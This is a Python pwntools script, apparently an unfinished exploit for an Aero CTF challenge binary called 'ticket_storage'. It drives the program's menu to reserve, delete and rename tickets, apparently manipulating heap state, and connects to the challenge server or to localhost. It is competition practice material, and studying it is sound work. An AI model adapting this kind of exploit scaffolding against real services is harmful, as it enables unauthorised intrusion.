#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./ticket_storage"

rhp1 = {'host':"tasks.aeroctf.com",'port':33014}
rhp2 = {'host':"localhost",'port':12370}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

def hoge(conn,ix):
  conn.recvuntil("> ")
  conn.sendline(str(ix))

def reserve(conn,A,B,cost):
  hoge(conn,1)
  conn.recvuntil("city: ")
  conn.send(A)
  conn.recvuntil("city: ")
  conn.send(B)
  conn.recvuntil("cost: ")
  conn.sendline(str(cost))
  conn.recvuntil("id: ")
  return conn.recvline().rstrip()

def view_ticket(conn,ID):
  hoge(conn,2)
  conn.recvuntil("id: ")
  conn.sendline(ID)

def delete(conn,ID):
  hoge(conn,4)
  conn.recvuntil("id: ")
  conn.sendline(ID)

def change_name(conn,name):
  hoge(conn,5)
  conn.recvuntil("name: ")
  conn.send(name)

ids = []

def exploit(conn):
  #startup
  conn.recvuntil("name: ")
  conn.send("A"*0x88)

  #main
  #nameもcompareしてるからname変えると見れなくなる
  ids.append(reserve(conn,"A"*0x10,"B"*0x10,0x100))
  print("id1: "+ids[0])
  delete(conn,ids[0])
  change_name(conn,"C")
  ids[0] = reserve(conn,"D"*0x10,"E"*0x10,0x200)
  print("id1: "+ids[0])

  for i in range(7):
    ids.append(reserve(conn,"E"*0x10,"F"*0x10,0x100))


if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

